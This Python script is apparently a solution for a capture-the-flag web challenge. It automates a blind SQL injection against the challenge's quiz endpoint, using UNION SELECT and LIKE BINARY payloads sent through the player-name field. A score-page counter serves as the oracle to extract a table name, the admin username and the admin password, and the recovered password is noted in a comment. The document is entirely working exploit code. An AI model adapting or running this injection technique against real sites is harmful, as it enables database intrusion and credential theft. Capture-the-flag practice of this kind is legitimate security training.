#!/usr/bin/env python3

import requests
import re
import sys

ENDPOINT = 'https://hackyholidays.h1ctf.com/evil-quiz/'
LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'
ALL_CHARS = LOWERCASE + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' + '-$_'
table_name_exploit = "union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary "
username_exploit = "union select 1, 2, 3, 4 from admin where username like binary "
password_exploit = "union select 1, 2, 3, 4 from admin where password like binary "
cookie = ''

def process(exploit, charset=LOWERCASE):
    accumulator = ''
    while True:
        for char in charset:
            if run_exploit(exploit + f"'{accumulator}{char}%'"):
                accumulator += char
                break
        print(f"Result: '{accumulator}%'")

def run_exploit(exploit):
    payload = build_payload(exploit)
    name = requests.post(ENDPOINT, cookies=cookie, data = {'name': payload})
    start = requests.post(ENDPOINT + 'start', cookies=cookie, data = {'ques_1': 0, 'ques_2': 0, 'ques_3': 0})
    score = requests.get(ENDPOINT + 'score', cookies=cookie)
    
    success = int(re.search("There is ([0-9]+) other player\(s\) with the same name as you!", str(score.content)).groups()[0]) > 0
    return success

def build_payload(exploit):
    return "testerbtgsg54g45' " + exploit + "-- "

r = requests.get(ENDPOINT)
cookie = { 'session': r.cookies['session'] }

sys.argv[1] == 'TABLE_NAME' and process(table_name_exploit) # admin
sys.argv[1] == 'USERNAME' and process(username_exploit) # admin
sys.argv[1] == 'PASSWORD' and process(password_exploit, charset=ALL_CHARS) # S3creT_p4ssw0rd-$
